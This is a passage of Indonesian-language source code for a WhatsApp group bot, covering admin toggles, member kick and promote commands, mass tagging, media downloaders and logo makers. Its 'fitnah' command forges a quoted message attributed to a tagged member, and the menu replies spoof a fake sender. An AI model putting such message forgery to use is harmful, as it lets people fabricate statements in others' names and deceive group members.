					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antibadword 1`)
					if (Number(args[0]) === 1) {
						if (isBadWord) return reply('Sudah Aktif Kak')
						badword.push(from)
						fs.writeFileSync('./database/badword.json', JSON.stringify(badword))
						reply('「 SUKSES 」Fitur Anti Badword Diaktifkan')
						dila.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti Badword\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (Number(args[0]) === 0) {
						if (!isBadWord) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						badword.splice(ini, 1)
						fs.writeFileSync('./database/badword.json', JSON.stringify(badword))
						reply('「 SUKSES 」Fitur Anti Badword Dimatikan')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break

				case 'welcome':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}welcome 1`)
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Sudah Aktif Kak')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('「 SUKSES 」Fitur Welcome Diaktifkan')
					} else if (Number(args[0]) === 0) {
						if (!isWelkom) return reply('Sudah Mati Kak')
						welkom.splice(from, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						reply('「 SUKSES 」Fitur Welcome Dimatikan')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
case 'antibule':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antibule 1`)
				    if (Number(args[0]) === 1) {
						if (isKickArea) return reply('Sudah Aktif Kak')
						kickarea.push(from)
						fs.writeFileSync('./database/kickarea.json', JSON.stringify(kickarea))
						reply(`Sukses mengaktifkan fitur antibule di group *${groupMetadata.subject}*`)
			  } else if (Number(args[0]) === 0) {
						if (!isKickArea) return reply('Sudah Mati Kak')
						kickarea.splice(from, 1)
						fs.writeFileSync('./database/kickarea.json', JSON.stringify(kickarea))
						reply(`Sukses menonaktifkan fitur antibule di group *${groupMetadata.subject}*`)
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
						break
				case 'leveling':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}leveling 1`)
					if (Number(args[0]) === 1) {
						if (isLevelingOn) return reply('Sudah Aktif Kak')
						_leveling.push(from)
						fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
						reply('「 SUKSES 」Fitur Level Diaktifkan')
					} else if (Number(args[0]) === 0) {
						_leveling.splice(from, 1)
						fs.writeFileSync('./database/leveling.json', JSON.stringify(_leveling))
						reply('「 SUKSES 」Fitur Level Dimatikan')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break

				case 'antilink':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antilink 1`)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('「 SUKSES 」Fitur Anti Link Diaktifkan')
						dila.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('「 SUKSES 」Fitur Anti Link Dimatikan')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break

				case 'grup':
				case 'group':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply(`untuk membuka : ${prefix}group buka\nuntuk menutup : ${prefix}group tutup`)
					if (args[0] === 'buka') {
						reply(`Berhasil Membuka group`)
						dila.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'tutup') {
						reply(`Berhasil Menutup Group`)
						dila.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					break

				case 'admin':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					if (!isGroup) return reply(dla.groupo())
					adm = `*ATASAN GROUP* _${groupMetadata.subject}_\n*TOTAL* : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						adm += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(adm, groupAdmins, true)
					break

				case 'add':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (args.length < 1) return reply('Yang mau di add siapa?')
					if (args[0].startsWith('08')) return reply('Gunakan kode bahasa kak')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						dila.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Anjim yang mau di add di private, dahlah :)')
					}
					break
					
					case 'hidetag':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					var value = body.slice(9)
					var group = await dila.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: Lan
					}
					dila.sendMessage(from, options, text)
					break
				case 'level':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isLevelingOn) return reply(dla.lvlnoon())
					if (!isGroup) return reply(dla.groupo())
					const userLevel = getLevelingLevel(sender)
					const userXp = getLevelingXp(sender)
					if (userLevel === undefined && userXp === undefined) return reply(dla.lvlnul())
					const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
					resul = `┌「 *LEVEL* 」
│
├ ❏ *Nama* : ${pushname}
├ ❏ *Nomor* : wa.me/${sender.split("@")[0]}
├ ❏ *Xp* : ${userXp}/${requiredXp}
└ ❏ *Level* : ${userLevel}`
					dila.sendMessage(from, resul, text, { quoted: Lan })
						.catch(async (err) => {
							console.error(err)
							await reply(`Error!\n${err}`)
						})
					break

				case 'linkgrup':
				case 'linkgroup':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					if (!isGroup) return reply(dla.groupo())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					linkgc = await dila.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
					dila.sendMessage(from, yeh, text, { quoted: Lan })
					break

				case 'tagall':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					members_id = []
					taga = (args.length > 1) ? body.slice(8).trim() : ''
					taga += '\n\n'
					for (let mem of groupMembers) {
						taga += `❏ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(taga, members_id, true)
					break

				case 'setname':
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					dila.groupUpdateSubject(from, `${body.slice(9)}`)
					dila.sendMessage(from, '「 SUKSES 」Mengubah Nama Grup', text, { quoted: Lan })
					break

				case 'setdesc':
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					dila.groupUpdateDescription(from, `${body.slice(9)}`)
					dila.sendMessage(from, '*「 SUKSES 」Mengubah Desk Grup', text, { quoted: Lan })
					break

				case 'demote':
				case 'demot':
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 𝘆𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						dem = ''
						for (let _ of mentioned) {
							dem += `*jabatan kamu di copot*🏃 :\n`
							dem += `@_.split('@')[0]`
						}
						mentions(dem, mentioned, true)
						dila.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Yahh @${mentioned[0].split('@')[0]} Jabatan kamu sebagai leluhur di grup telah di copot🏃`, mentioned, true)
						dila.groupDemoteAdmin(from, mentioned)
					}
					break

				case 'promote':
				case 'promot':
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
					if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('Tag Orang Nya Kak')
					mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						prom = ''
						for (let _ of mentioned) {
							prom += `Yeee?? Kamu naik jabatan >_< :\n`
							prom += `@_.split('@')[0]`
						}
						mentions(prom, mentioned, true)
						dila.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`Selamat🥳 @${mentioned[0].split('@')[0]} *anda naik menjadi admin group* >_<`, mentioned, true)
						dila.groupMakeAdmin(from, mentioned)
					}
					break
case 'kick':
if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin()) 
				   if (Lan.message.extendedTextMessage === undefined || Lan.message.extendedTextMessage === null) return reply('Tag Orangnya!')
					mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `Bismillah kick beban\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						dila.groupRemove(from, mentioned)
					} else {
						mentions(`Sayonara @${mentioned[0].split('@')[0]}`, mentioned, true)
						dila.groupRemove(from, mentioned)
					}
					break
				case 'fitnah':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				var split = args.join(' ').replace(/@|\d/gi, '').split('|')
				var taged = Lan.message.extendedTextMessage.contextInfo.mentionedJid[0]
				const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
							extendedTextMessage: {
								text: split[0]
							}
						}
					}
				}
				dila.sendMessage(from, `${split[1]}`, MessageType.text, target)
				break

				case 'jadian':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!isGroup) return reply(dla.groupo())
					jds = []
					var kamu = groupMembers
					var cinta = groupMembers
					var aku = cinta[Math.floor(Math.random() * kamu.length)]
					var cintax = kamu[Math.floor(Math.random() * cinta.length)]
					tejs = `Ciee.. yang lagi jadian\n*@${aku.jid.split('@')[0]}* ❤ *@${cintax.jid.split('@')[0]}*\nSemoga Langgeng Hii`
					jds.push(aku.jid)
					jds.push(cintax.jid)
					mentions(tejs, jds, true)
					break

				case 'del':
				case 'delete':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					dila.deleteMessage(from, { id: Lan.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break

				case 'mining':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!isGroup) return reply(dla.groupo())
					if (!isEventon) return reply(`maaf ${pushname} event mining tidak di aktifkan sama owner ${ownerName}`)
					if (isOwner) {
						const one = 999999999
						addLevelingXp(sender, one)
						addLevelingLevel(sender, 99)
						reply(`karena ${ownerName} baik Bot memberikan ${one}Xp >_<`)
					} else {
						const mining = Math.ceil(Math.random() * 10000)
						addLevelingXp(sender, mining)
						await reply(`*selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					break

				case 'downloadmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const donlot = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}play\`\`\`
\`\`\`│◪ ${prefix}ytsearch\`\`\`
\`\`\`│◪ ${prefix}ytmp3\`\`\`
\`\`\`│◪ ${prefix}ytmp4\`\`\`
\`\`\`│◪ ${prefix}tiktok\`\`\`
\`\`\`│◪ ${prefix}tiktokaudio\`\`\`
\`\`\`│◪ ${prefix}igphoto\`\`\`
\`\`\`│◪ ${prefix}igvideo\`\`\`
\`\`\`│◪ ${prefix}joox\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, donlot, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Download Menu', orderTitle: 'Download Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
					case 'bitly':
					if (isBanned) return reply(dla.baned())
if (!isRegistered) return reply(dla.noregis())
				dila.updatePresence(from, Presence.composing) 
                data = await fetchJson(`https://tobz-api.herokuapp.com/api/bitly?url=${args.join(' ')}&apikey=BotWeA`)
                hasil = `link : ${args.join(' ')}\n\nOutput : ${data.result}`
                reply(hasil)
                break
					case 'mimpi':
					if (isBanned) return reply(dla.baned())
if (!isRegistered) return reply(dla.noregis())
if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
 await limitAdd(sender)
			    anu = await fetchJson(`https://api.arugaz.my.id/api/primbon/tafsirmimpi?mimpi=${args.join(' ')}`, {method: 'get'})
			        mimpi = `Arti Mimpi *${args.join(' ')}* Adalah:\n${anu.result.hasil}`
			        dila.sendMessage(from, mimpi, text, {quoted:Lan, contextInfo: {"forwardingScore": 999, "isForwarded": true}}) 
			       	break
					case 'jadwaltv':
					if (isBanned) return reply(dla.baned())
if (!isRegistered) return reply(dla.noregis())
if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
 await limitAdd(sender)
                 jadwaltv = `${args.join(' ')}`
                anu = await fetchJson(`https://api.zeks.xyz/api/?channel=${jadwaltv}&apikey=apivinz`, {method: 'get'})
                jtv = `${anu.result}`
                dila.sendMessage(from, jtv, text, {quoted:Lan, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
               	break
 case 'lirik':
 if (isBanned) return reply(dla.baned())
if (!isRegistered) return reply(dla.noregis())
if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
 await limitAdd(sender)
 pe = args.join(' ')
 anu = await fetchJson(`https://videfikri.com/api/liriklagu/?query=${pe}`)
 buf = await getBuffer(`${anu.result.lirik}`)
 dila.sendMessage(from, buf, text, {quoted:Lan })
 break
					case 'tiktok':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(dla.Iv())
 		if (!q) return reply('Linknya?')
 		reply(dla.wait())
		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		console.log(result)
    		const { videonowm, videonowm2, text } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
    		.then(async (a) => {
    		me = `*Title* : ${text}\n*Link* : ${a.data}`
		dila.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',duration: 999999999,quoted:Lan,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
   case 'tiktokaudio':
     if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return reply('Linknya?')
 		reply(dla.wait())
 		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		const { music,text } = result
		dila.sendMessage(from,{url:`${music}`},audio,{mimetype:'audio/mp4',filename : `${text}`,quoted:Lan})
		})
     		.catch(e => console.log(e))
     		break
				case 'igphoto':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply('Link Nya Mana Kak')
					anu = await fetchJson(`https://api.xteam.xyz/dl/ig?url=${q}&APIKEY=${xteam}`)
					reply(dla.wait())
					buff = await getBuffer(anu.result.data[0].data)
					dila.sendMessage(from, buff, image, { quoted: Lan })
					break

				case 'ig':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
 pe = args.join(' ')
 anu = await fetchJson(`https://videfikri.com/api/igdl/?url=${pe}`)
 buf = await getBuffer(`${anu.result.video}`)
 dila.sendMessage(from, buf, video, {quoted:Lan, caption: `Nih kak` })
 break
				case 'joox':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/joox?q=${args.join(' ')}&apikey=BotWeA`, { method: 'get' })
				teks = '「 *_JOOX MP3_* 」\n'
				const joox = data.result
				teks += `\n❏ *Judul* : ${joox.title}\n❏ *Album* : ${joox.album}\n❏ *Publish At* : ${joox.dipublikasi}\n\n Bentar kak Audionya lagi dikirim`
				thumb = await getBuffer(joox.thumb)
				reply(dla.wait())
				dila.sendMessage(from, thumb, image, { quoted:Lan, caption: teks })
				buffer = await getBuffer(joox.mp3)
				dila.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', filename: `${joox.title}.mp3`, quoted:Lan })
				break
				case 'makermenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const Laner = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}comictext\`\`\`
\`\`\`│◪ ${prefix}hekerlogo\`\`\`
\`\`\`│◪ ${prefix}graffiti\`\`\`
\`\`\`│◪ ${prefix}glowtext\`\`\`
\`\`\`│◪ ${prefix}covertext\`\`\`
\`\`\`│◪ ${prefix}narutotext\`\`\`
\`\`\`│◪ ${prefix}erodedtext\`\`\`
\`\`\`│◪ ${prefix}walltext\`\`\`
\`\`\`│◪ ${prefix}vietteltext\`\`\`
\`\`\`│◪ ${prefix}wingstext\`\`\`
\`\`\`│◪ ${prefix}halloween\`\`\`
\`\`\`│◪ ${prefix}graffiti2\`\`\`
\`\`\`│◪ ${prefix}graffiti3\`\`\`
\`\`\`│◪ ${prefix}foiltext\`\`\`
\`\`\`│◪ ${prefix}bloodtext\`\`\`
\`\`\`│◪ ${prefix}hekertext\`\`\`
\`\`\`│◪ ${prefix}bokehtext\`\`\`
\`\`\`│◪ ${prefix}carbontext\`\`\`
\`\`\`│◪ ${prefix}avengerstext\`\`\`
\`\`\`│◪ ${prefix}watertext\`\`\`
\`\`\`│◪ ${prefix}firetext\`\`\`
\`\`\`│◪ ${prefix}metaltext\`\`\`
\`\`\`│◪ ${prefix}ballontext\`\`\`
\`\`\`│◪ ${prefix}gemboktext\`\`\`
\`\`\`│◪ ${prefix}bannerff\`\`\`
\`\`\`│◪ ${prefix}aloklogo\`\`\`
\`\`\`│◪ ${prefix}miyalogo\`\`\`
\`\`\`│◪ ${prefix}gamelogo\`\`\`
\`\`\`│◪ ${prefix}blackpink\`\`\`
\`\`\`│◪ ${prefix}thundername\`\`\`
\`\`\`│◪ ${prefix}silktext\`\`\`
\`\`\`│◪ ${prefix}partytext\`\`\`
\`\`\`│◪ ${prefix}romancetext\`\`\`
\`\`\`│◪ ${prefix}googletext\`\`\`
\`\`\`│◪ ${prefix}glowtext2\`\`\`
\`\`\`│◪ ${prefix}lovemessage\`\`\`
\`\`\`│◪ ${prefix}glitchtext\`\`\`
\`\`\`│◪ ${prefix}galaxytext\`\`\`
\`\`\`│◪ ${prefix}pornhub\`\`\`
\`\`\`│◪ ${prefix}tahta\`\`\`
\`\`\`│◪ ${prefix}wetglass\`\`\`
\`\`\`│◪ ${prefix}stylelogo\`\`\`
\`\`\`│◪ ${prefix}watercolor\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, Laner, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Maker Menu', orderTitle: 'Maker Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break

				case 'comictext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}comictext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/comic_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'hekerlogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}hekerlogo Dns`)
					reply(`[🗿] Buset Hemker`)
					vhbuff = await getBuffer(`https://api.vhtear.com/hacker_avatar?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'graffiti':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(10)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}graffiti Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/cool_wall_graffiti?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'glowtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}glowtext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/glow_metallic?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'covertext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}covertext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/cover_banner?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'narutotext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}narutotext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/naruto_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'erodedtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}erodedtext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/eroded_metal?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'walltext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}walltext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/the_wall?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'vietteltext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}vietteltext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/viettel_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'wingstext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}wingstext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/wings_galaxy?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'halloween':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}halloween Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/halloween_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'graffiti2':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(11)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}graffiti2 Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/girl_graffiti?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'graffiti3':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}graffiti3 Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/cartoon_graffiti?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'foiltext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}foiltext Dns`)
					reply(dla.wait())
